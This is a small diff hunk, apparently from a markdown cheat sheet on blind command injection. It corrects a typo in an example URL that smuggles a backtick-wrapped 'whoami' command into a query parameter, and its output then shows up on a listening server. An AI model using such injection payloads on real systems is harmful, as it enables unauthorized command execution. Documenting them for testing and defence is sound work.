@@ -18,7 +18,7 @@
 ```
 ### Blind
 ```Python
-http://LOCALHIP>:PORT/?=`whoami`
+http://LOCALIP>:PORT/?=`whoami`
 ```
 Response on listening server:
 ```Python
